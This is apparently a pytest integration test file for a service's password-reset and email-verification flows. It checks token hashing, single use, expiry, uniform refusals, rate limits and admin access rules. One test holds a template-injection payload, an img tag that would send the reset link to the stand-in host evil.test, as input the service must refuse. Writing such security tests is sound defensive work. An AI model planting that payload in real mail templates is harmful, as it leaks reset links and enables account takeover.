"""Password reset and email verification (single-use, hashed, expiring tokens sent by email).

Every failure path answers the same way: the reset request is always ``202`` (no user
enumeration), and every refused token is the same ``400 invalid_token``.
"""

from __future__ import annotations

import re
from typing import Any

import pytest

from axentra.api.app import create_app
from axentra.data.database import DbScope
from axentra.identity.tokens import hash_token
from tests.integration.conftest import ADMIN_EMAIL, Browser, World, bootstrap_admin

RESET = "/v1/auth/password-reset"
RESET_CONFIRM = "/v1/auth/password-reset/confirm"
VERIFY = "/v1/me/email-verification"
VERIFY_CONFIRM = "/v1/auth/email-verification/confirm"
PASSWORD = "user password 12345"
NEW_PASSWORD = "a brand new passphrase 77"


def _ok(r: Any, code: int = 200) -> Any:
    assert r.status_code == code, r.text
    return r.json() if r.content else None


def _product(world: World, slug: str = "crm") -> str:
    return str(_ok(world.admin.post("/v1/products", json={"slug": slug, "name": slug.upper()}), 201)["id"])


def _member(world: World, pid: str, email: str, *, create: bool = True) -> str | None:
    """A product operator (the simplest product relation)."""
    uid = world.user(email) if create else None
    _ok(world.admin.post(f"/v1/products/{pid}/members", json={"email": email, "role": "product_viewer"}), 201)
    return uid


def _anon(world: World) -> Browser:
    return world.browser()


def _messages(world: World, pid: str, key: str) -> list[dict[str, Any]]:
    return list(
        _ok(world.admin.get(f"/v1/products/{pid}/notify/messages", params={"template_key": key}))["items"]
    )


def _delivered_token(world: World, pid: str, prefix: str, recipient: str) -> tuple[str, dict[str, Any]]:
    """Send the queued mail and read the token from the local mailbox."""
    world.ax.notify.dispatcher().run_once(10)  # type: ignore[union-attr]
    box = _ok(world.admin.get(f"/v1/products/{pid}/notify/mailbox", params={"recipient": recipient}))
    mail = box["items"][0]
    found = re.search(rf"{prefix}[A-Za-z0-9_-]+", mail["text"])
    assert found, mail["text"]
    return found.group(0), mail


def _audit(world: World, action: str) -> list[Any]:
    return list(world.ax.audit.list(DbScope.platform(), action=action).items)


def _tokens(world: World, user_id: str) -> list[dict[str, Any]]:
    with world.ax.db.transaction(DbScope.platform()) as tx:
        return tx.all(
            "SELECT purpose, token_hash, email, used_at, expires_at FROM axentra_account_tokens"
            " WHERE user_id = %s ORDER BY created_at",
            (user_id,),
        )


def _sql(world: World, sql: str, params: tuple[Any, ...]) -> None:
    with world.ax.db.transaction(DbScope.platform()) as tx:
        tx.execute(sql, params)


def _past_cooldown(world: World, user_id: str) -> None:
    _sql(
        world,
        "UPDATE axentra_account_tokens SET created_at = created_at - interval '2 minutes' WHERE user_id = %s",
        (user_id,),
    )


def _reset_token(world: World, pid: str, email: str) -> str:
    _ok(_anon(world).post(RESET, json={"email": email}), 202)
    token, _ = _delivered_token(world, pid, "axpwr_", email)
    return token


def _invalid(r: Any) -> None:
    assert r.status_code == 400, r.text
    body = r.json()
    assert body["code"] == "invalid_token"
    assert body["detail"] == "the link is invalid, expired or was already used"


# -- password reset -------------------------------------------------------------------------------


def test_reset_flow_end_to_end(world: World, caplog: pytest.LogCaptureFixture) -> None:
    pid = _product(world)
    uid = _member(world, pid, "bob@example.com")
    assert uid
    logged_in = world.login_as("bob@example.com")
    assert _ok(logged_in.get("/v1/me"))["user"]["email_verified"] is False

    r = _anon(world).post(RESET, json={"email": "  BOB@example.com "})
    assert r.status_code == 202 and r.content == b""
    assert r.headers["cache-control"] == "no-store"
    (m,) = _messages(world, pid, "password_reset")
    # Sensitive template: the product admin cannot read the link.
    assert m["recipient"] == "bob@example.com" and m["content_state"] == "redacted"
    assert m["idempotency_key"].startswith("account:act_")
    token, mail = _delivered_token(world, pid, "axpwr_", "bob@example.com")
    assert "http://127.0.0.1:8080/reset-password?token=" + token in mail["text"]
    assert "30 minutes" in mail["text"] or "expires" in mail["text"].lower()
    # Only the hash is stored.
    (row,) = _tokens(world, uid)
    assert row["token_hash"] == hash_token(token) and token not in str(row)

    # A password the policy refuses keeps the link usable.
    r = _anon(world).post(RESET_CONFIRM, json={"token": token, "new_password": "short"})
    assert r.status_code == 422, r.text
    assert _tokens(world, uid)[0]["used_at"] is None

    _ok(_anon(world).post(RESET_CONFIRM, json={"token": token, "new_password": NEW_PASSWORD}), 204)
    # All sessions ended; the old password no longer works, the new one does.
    assert logged_in.get("/v1/me").status_code == 401
    assert (
        _anon(world)
        .post("/v1/auth/login/password", json={"email": "bob@example.com", "password": PASSWORD})
        .status_code
        == 401
    )
    fresh = world.login_as("bob@example.com", NEW_PASSWORD)
    # The link arrived by email: the address is now verified.
    assert _ok(fresh.get("/v1/me"))["user"]["email_verified"] is True
    # Single use.
    _invalid(
        _anon(world).post(RESET_CONFIRM, json={"token": token, "new_password": "yet another passphrase 9"})
    )

    (req,) = _audit(world, "identity.password.reset_request")
    assert req.outcome == "success" and req.target_id == uid and req.details == {"product_id": pid}
    (done,) = _audit(world, "identity.password.reset")
    assert done.target_id == uid and done.details["sessions_ended"] >= 1 and done.actor_id == uid
    assert token not in caplog.text


@pytest.mark.parametrize("case", ["unknown", "disabled", "no_password", "no_product", "cooldown"])
def test_reset_request_never_reveals_an_account(world: World, case: str) -> None:
    pid = _product(world)
    email = f"{case}@example.com"
    if case != "unknown":
        uid = _member(world, pid, email) if case != "no_product" else world.user(email)
    if case == "disabled":
        _sql(world, "UPDATE axentra_users SET status = 'disabled' WHERE id = %s", (uid,))
    if case == "no_password":
        _sql(world, "UPDATE axentra_users SET password_hash = NULL WHERE id = %s", (uid,))
    if case == "cooldown":
        _ok(_anon(world).post(RESET, json={"email": email}), 202)
    # The same answer as for a real account (see test_reset_flow_end_to_end).
    r = _anon(world).post(RESET, json={"email": email})
    assert r.status_code == 202 and r.content == b""
    expected = 1 if case == "cooldown" else 0
    assert len(_messages(world, pid, "password_reset")) == expected
    reason = {
        "unknown": "unknown_email",
        "disabled": "user_disabled",
        "no_password": "no_password",
        "no_product": "no_delivery_product",
        "cooldown": "cooldown",
    }[case]
    denied = [e for e in _audit(world, "identity.password.reset_request") if e.outcome == "denied"]
    assert [e.details for e in denied] == [{"reason": reason}]
    assert email not in denied[0].model_dump_json()  # the address is not recorded


def test_new_reset_link_replaces_the_older_one(world: World) -> None:
    pid = _product(world)
    uid = _member(world, pid, "bob@example.com")
    assert uid
    first = _reset_token(world, pid, "bob@example.com")
    _past_cooldown(world, uid)
    _ok(_anon(world).post(RESET, json={"email": "bob@example.com"}), 202)
    assert len(_messages(world, pid, "password_reset")) == 2
    _invalid(_anon(world).post(RESET_CONFIRM, json={"token": first, "new_password": NEW_PASSWORD}))


def test_reset_token_refusals_are_uniform(world: World) -> None:
    pid = _product(world)
    uid = _member(world, pid, "bob@example.com")
    assert uid
    token = _reset_token(world, pid, "bob@example.com")
    confirm = {"token": token, "new_password": NEW_PASSWORD}
    # Unknown and malformed tokens.
    _invalid(_anon(world).post(RESET_CONFIRM, json={"token": "axpwr_nope", "new_password": NEW_PASSWORD}))
    _invalid(_anon(world).post(RESET_CONFIRM, json={"token": "", "new_password": NEW_PASSWORD}))
    # A reset token is not a verification token (and the other way round).
    _invalid(_anon(world).post(VERIFY_CONFIRM, json={"token": token}))
    # Expired.
    _sql(
        world,
        "UPDATE axentra_account_tokens SET expires_at = now() - interval '1 second' WHERE user_id = %s",
        (uid,),
    )
    _invalid(_anon(world).post(RESET_CONFIRM, json=confirm))
    _sql(
        world,
        "UPDATE axentra_account_tokens SET expires_at = now() + interval '5 minutes' WHERE user_id = %s",
        (uid,),
    )
    # Disabled user.
    _sql(world, "UPDATE axentra_users SET status = 'disabled' WHERE id = %s", (uid,))
    _invalid(_anon(world).post(RESET_CONFIRM, json=confirm))
    _sql(world, "UPDATE axentra_users SET status = 'active' WHERE id = %s", (uid,))
    # The address changed since the link was sent.
    _sql(world, "UPDATE axentra_users SET email = 'bob2@example.com' WHERE id = %s", (uid,))
    _invalid(_anon(world).post(RESET_CONFIRM, json=confirm))
    _sql(world, "UPDATE axentra_users SET email = 'bob@example.com' WHERE id = %s", (uid,))
    # The password was removed (the user now logs in through an identity provider only).
    _sql(world, "UPDATE axentra_users SET password_hash = NULL WHERE id = %s", (uid,))
    _invalid(_anon(world).post(RESET_CONFIRM, json=confirm))
    _sql(world, "UPDATE axentra_users SET password_hash = 'x' WHERE id = %s", (uid,))
    # None of the refusals spent the link.
    _ok(_anon(world).post(RESET_CONFIRM, json=confirm), 204)
    assert _audit(world, "identity.password.reset")


def test_password_change_spends_open_reset_links(world: World) -> None:
    pid = _product(world)
    _member(world, pid, "bob@example.com")
    token = _reset_token(world, pid, "bob@example.com")
    bob = world.login_as("bob@example.com")
    _ok(bob.post("/v1/me/password", json={"current_password": PASSWORD, "new_password": NEW_PASSWORD}), 204)
    _invalid(
        _anon(world).post(RESET_CONFIRM, json={"token": token, "new_password": "something else entirely"})
    )


def test_reset_is_rate_limited(ax_factory: Any) -> None:
    ax = ax_factory(security={"login_rate_per_minute": 2})
    app = create_app(axentra=ax, start=False)
    world = World(ax=ax, app=app, admin=bootstrap_admin(ax, app))
    anon = _anon(world)
    # The request budget (3 x login rate) is per IP and the same for known and unknown addresses.
    codes = [anon.post(RESET, json={"email": f"u{i}@example.com"}).status_code for i in range(7)]
    assert codes == [202] * 6 + [429]
    # Wrong tokens count against the confirm budget.
    codes = [
        anon.post(RESET_CONFIRM, json={"token": f"axpwr_x{i}", "new_password": NEW_PASSWORD}).status_code
        for i in range(3)
    ]
    assert codes == [400, 400, 429]
    codes = [anon.post(VERIFY_CONFIRM, json={"token": f"axemv_x{i}"}).status_code for i in range(3)]
    assert codes == [400, 400, 429]


def test_reset_needs_password_login_and_the_origin(ax_factory: Any) -> None:
    ax = ax_factory()
    app = create_app(axentra=ax, start=False)
    world = World(ax=ax, app=app, admin=bootstrap_admin(ax, app))
    r = world.browser().post(RESET, json={"email": ADMIN_EMAIL}, headers={"Origin": "https://evil.test"})
    assert r.status_code == 403
    ax.settings.security.password_login = False
    assert _anon(world).post(RESET, json={"email": ADMIN_EMAIL}).status_code == 403
    assert (
        _anon(world).post(RESET_CONFIRM, json={"token": "axpwr_x", "new_password": NEW_PASSWORD}).status_code
        == 403
    )


def test_reset_answer_does_not_depend_on_the_mail_hook(world: World) -> None:
    pid = _product(world)
    _member(world, pid, "bob@example.com")

    def broken(_mail: Any) -> None:
        raise RuntimeError("smtp down")

    world.ax.on_account_email = broken  # type: ignore[attr-defined]
    r = _anon(world).post(RESET, json={"email": "bob@example.com"})
    assert r.status_code == 202 and r.content == b""


def test_reset_product_hint_only_for_own_products(world: World) -> None:
    a = _product(world, "alpha")
    b = _product(world, "beta")
    c = _product(world, "gamma")
    uid = _member(world, a, "bob@example.com")
    _member(world, b, "bob@example.com", create=False)
    assert uid
    _ok(_anon(world).post(RESET, json={"email": "bob@example.com", "product_id": b}), 202)
    assert len(_messages(world, b, "password_reset")) == 1 and not _messages(world, a, "password_reset")
    # A product the user does not belong to is ignored (no oracle for its admins): the oldest one sends.
    _past_cooldown(world, uid)
    _ok(_anon(world).post(RESET, json={"email": "bob@example.com", "product_id": c}), 202)
    assert not _messages(world, c, "password_reset")
    assert len(_messages(world, a, "password_reset")) == 1


def test_reset_link_base_and_single_mode(ax_factory: Any) -> None:
    ax = ax_factory(
        mode="single",
        product={"slug": "crm", "name": "CRM"},
        notify={"account_url": "https://account.example.com/auth"},
    )
    app = create_app(axentra=ax, start=False)
    world = World(ax=ax, app=app, admin=bootstrap_admin(ax, app))
    pid = str(_ok(world.admin.get("/v1/products"))[0]["id"])
    # In single mode the configured product sends, also for a user without a product relation.
    world.user("bob@example.com")
    _ok(_anon(world).post(RESET, json={"email": "bob@example.com"}), 202)
    token, mail = _delivered_token(world, pid, "axpwr_", "bob@example.com")
    assert f"https://account.example.com/auth/reset-password?token={token}" in mail["text"]


# -- email verification ---------------------------------------------------------------------------


def test_email_verification_flow(world: World) -> None:
    pid = _product(world)
    uid = _member(world, pid, "bob@example.com")
    assert uid
    bob = world.login_as("bob@example.com")
    assert _anon(world).post(VERIFY, json={}).status_code == 401
    _ok(bob.post(VERIFY, json={}), 202)
    r = bob.post(VERIFY, json={})
    assert r.status_code == 429 and r.headers.get("retry-after")
    (m,) = _messages(world, pid, "email_verification")
    assert m["content_state"] == "redacted"
    token, mail = _delivered_token(world, pid, "axemv_", "bob@example.com")
    assert f"/verify-email?token={token}" in mail["text"]
    # A verification token cannot reset the password.
    _invalid(_anon(world).post(RESET_CONFIRM, json={"token": token, "new_password": NEW_PASSWORD}))
    # No session needed (the link may be opened in another browser).
    _ok(_anon(world).post(VERIFY_CONFIRM, json={"token": token}), 204)
    assert _ok(bob.get("/v1/me"))["user"]["email_verified"] is True
    assert _ok(world.admin.get(f"/v1/users/{uid}"))["email_verified"] is True
    _invalid(_anon(world).post(VERIFY_CONFIRM, json={"token": token}))
    assert bob.post(VERIFY, json={}).status_code == 409
    assert [e.outcome for e in _audit(world, "identity.email.verification_request")] == ["success"]
    (ev,) = _audit(world, "identity.email.verify")
    assert ev.target_id == uid and ev.actor_id == uid


def test_email_verification_refusals(world: World) -> None:
    pid = _product(world)
    uid = _member(world, pid, "bob@example.com")
    assert uid
    bob = world.login_as("bob@example.com")
    _ok(bob.post(VERIFY, json={}), 202)
    token, _ = _delivered_token(world, pid, "axemv_", "bob@example.com")
    _sql(
        world,
        "UPDATE axentra_account_tokens SET expires_at = now() - interval '1 second' WHERE user_id = %s",
        (uid,),
    )
    _invalid(_anon(world).post(VERIFY_CONFIRM, json={"token": token}))
    # A new link replaces the old one.
    _past_cooldown(world, uid)
    _sql(
        world,
        "UPDATE axentra_account_tokens SET expires_at = now() + interval '1 hour' WHERE user_id = %s",
        (uid,),
    )
    _ok(bob.post(VERIFY, json={}), 202)
    _invalid(_anon(world).post(VERIFY_CONFIRM, json={"token": token}))
    assert _ok(bob.get("/v1/me"))["user"]["email_verified"] is False
    # A user no product can send for gets 409 (nothing is created).
    lone = world.user("lone@example.com")
    lone_b = world.login_as("lone@example.com")
    assert lone_b.post(VERIFY, json={}).status_code == 409
    assert _tokens(world, lone) == []


def test_identity_provider_confirmed_addresses_are_verified(world: World) -> None:
    uid = world.ax.identity.link_external_identity(
        provider="corp",
        subject="sub-1",
        email="carol@example.com",
        name="Carol",
        email_verified=True,
        allow_signup=True,
        allowed_domains=[],
    )
    assert world.ax.identity.get_user(uid).email_verified is True
    other = world.ax.identity.link_external_identity(
        provider="corp",
        subject="sub-2",
        email="dan@example.com",
        name="Dan",
        email_verified=False,
        allow_signup=True,
        allowed_domains=[],
        allow_signup_without_email=True,
    )
    assert world.ax.identity.get_user(other).email_verified is False
    assert world.ax.identity.get_user(world.user("eve@example.com")).email_verified is False


def test_product_admins_cannot_reach_account_links(world: World) -> None:
    """A product admin can neither rewrite the account templates (an override could carry the link
    to another host) nor read the links in the local mailbox; platform admins can."""
    pid = _product(world)
    world.user("owner@example.com")
    _ok(
        world.admin.post(
            f"/v1/products/{pid}/members", json={"email": "owner@example.com", "role": "product_owner"}
        ),
        201,
    )
    owner = world.login_as("owner@example.com")
    _member(world, pid, "bob@example.com")
    for key in ("password_reset", "email_verification"):
        r = owner.post(
            f"/v1/products/{pid}/notify/templates",
            json={
                "key": key,
                "variants": {"en": {"subject": "x", "text": "<img src=https://evil.test/{{ reset_url }}>"}},
            },
        )
        assert r.status_code == 403, r.text
    _ok(_anon(world).post(RESET, json={"email": "bob@example.com"}), 202)
    world.ax.notify.dispatcher().run_once(10)  # type: ignore[union-attr]
    assert _ok(owner.get(f"/v1/products/{pid}/notify/mailbox"))["items"] == []
    (m,) = _ok(owner.get(f"/v1/products/{pid}/notify/messages", params={"template_key": "password_reset"}))[
        "items"
    ]
    assert m["content_state"] in ("redacted", "purged") and "axpwr_" not in str(m)
    assert len(_ok(world.admin.get(f"/v1/products/{pid}/notify/mailbox"))["items"]) == 1


def test_suspended_tenant_does_not_deliver(world: World) -> None:
    pid = _product(world)
    tid = str(
        _ok(world.admin.post(f"/v1/products/{pid}/tenants", json={"slug": "acme", "name": "Acme"}), 201)["id"]
    )
    world.user("ten@example.com")
    _ok(
        world.admin.post(
            f"/v1/products/{pid}/tenants/{tid}/members", json={"email": "ten@example.com", "role": "member"}
        ),
        201,
    )
    ten = world.login_as("ten@example.com")
    _ok(world.admin.patch(f"/v1/products/{pid}/tenants/{tid}", json={"status": "suspended"}))
    _ok(_anon(world).post(RESET, json={"email": "ten@example.com"}), 202)
    assert _messages(world, pid, "password_reset") == []
    assert ten.post(VERIFY, json={}).status_code == 409
    _ok(world.admin.patch(f"/v1/products/{pid}/tenants/{tid}", json={"status": "active"}))
    _ok(ten.post(VERIFY, json={}), 202)
